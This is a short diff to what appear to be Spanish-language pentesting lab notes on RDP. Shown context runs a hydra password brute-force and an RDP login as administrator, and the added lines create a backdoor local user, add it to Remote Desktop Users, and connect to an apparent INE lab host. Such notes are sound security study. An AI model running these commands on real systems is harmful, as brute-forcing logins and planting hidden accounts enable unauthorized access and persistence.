@@ -26,3 +26,15 @@ $ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /u
 
 $ xfreerdp /u:administrator /p:password123  /v:ta rget:port
 ```
+
+crear usuario rdp
+
+```bash
+net user guest_1 guestpwd /add
+net localgroup "Remote Desktop Users" guest_1 /add
+net user
+##
+
+xfreerdp /u:guest_1 /p:guestpwd /v:demo.ine.local
+
+```
